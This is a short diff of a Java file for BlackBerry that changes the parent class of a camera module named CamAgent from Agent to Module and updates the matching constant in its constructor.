@@ -18,7 +18,7 @@ import blackberry.debug.DebugLevel;
 /**
  * The Class CamAgent.
  */
-public final class CamAgent extends Agent {
+public final class CamAgent extends Module {
     //#ifdef DEBUG
     static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);
     //#endif
@@ -30,7 +30,7 @@ public final class CamAgent extends Agent {
      *            the agent status
      */
     public CamAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_CAM, agentEnabled, Conf.AGENT_CAM_ON_SD, "CamAgent");
+        super(Module.AGENT_CAM, agentEnabled, Conf.AGENT_CAM_ON_SD, "CamAgent");
     }
 
     /**
